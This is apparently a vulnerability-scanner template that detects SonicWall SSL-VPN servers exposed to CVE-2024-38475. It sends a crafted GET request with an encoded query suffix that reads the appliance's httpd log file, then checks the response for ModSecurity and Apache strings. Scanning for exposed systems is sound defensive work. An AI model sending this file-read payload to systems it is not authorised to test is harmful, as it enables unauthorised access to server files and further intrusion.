id: CVE-2024-38475

info:
  name: sonicwall-rce
  author: shaikhyaser
  severity: critical
  description: Detects vulnerable SonicWALL SSL-VPN servers prone to CVE-2024-38475.
  tags: sonicwall,apache,modsecurity,cve
  
reference:
  name: https://labs.watchtowr.com/sonicboom-from-stolen-tokens-to-remote-shells-sonicwall-sma100-cve-2023-44221-cve-2024-38475/

http:
  - method: GET
    path:
      - "{{BaseURL}}/mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css"

    headers:
      Host: "{{Host}}"

    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "\\[pid \\d+\\] ModSecurity.*configured"

      - type: regex
        part: body
        regex:
          - "mod_antiloris"

      - type: regex
        part: body
        regex:
          - "Apache/([\\d\\.]+).*configured"

    matchers-condition: and
